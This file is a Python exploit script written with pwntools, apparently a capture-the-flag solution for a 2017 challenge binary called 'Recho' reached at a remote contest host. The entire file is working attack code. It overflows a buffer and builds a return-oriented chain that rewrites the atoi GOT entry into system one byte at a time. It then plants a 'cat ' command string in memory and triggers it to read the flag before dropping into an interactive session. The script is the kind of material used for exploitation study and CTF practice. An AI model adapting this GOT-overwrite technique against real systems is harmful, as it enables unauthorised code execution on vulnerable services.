from pwn import *
#from os import *
#from sys import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
bin = ELF('Recho')
libc = ELF('libc.so')
local=0

p_rax_ret = 0x00000000004006fc
p_rdi_ret = 0x00000000004008a3
p_rsi_r15_ret = 0x00000000004008a1
p_add_prdi_al_ret = 0x000000000040070d

atoi = libc.symbols['atoi']
system = libc.symbols['system']
cat_flag = int('cat '[::-1].encode('hex'),16)
p_flag = 0x601054


while 1:
	if local:
		cn = process('./Recho')
	else:
		cn = remote("recho.2017.teamrois.cn", 9527)
	
	cn.recv()
	cn.sendline(str(0x1000))
	
	pay=''
	pay+='a'*0x30+'b'*8
	
	pay+=p64(p_rdi_ret)+p64(bin.got['atoi'])
	pay+=p64(p_rax_ret)+p64(system-atoi)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(bin.got['atoi']+1)
	pay+=p64(p_rax_ret)+p64((system-atoi)>>8)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(bin.got['atoi']+2)
	pay+=p64(p_rax_ret)+p64((system-atoi)>>16)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(p_flag)
	pay+=p64(p_rax_ret)+p64((cat_flag)&0xff)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(p_flag+1)
	pay+=p64(p_rax_ret)+p64((cat_flag>>8)&0xff)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(p_flag+2)
	pay+=p64(p_rax_ret)+p64((cat_flag>>16)&0xff)
	pay+=p64(p_add_prdi_al_ret)
	
	pay+=p64(p_rdi_ret)+p64(p_flag+3)
	pay+=p64(p_rax_ret)+p64((cat_flag>>24)&0xff)
	pay+=p64(p_add_prdi_al_ret)
	
	
	
	pay+=p64(p_rdi_ret)+p64(p_flag)
	pay+=p64(bin.plt['atoi'])
	
	cn.sendline(pay)
	
	cn.recv()
	cn.shutdown("send")
	cn.interactive()
	cn.close()
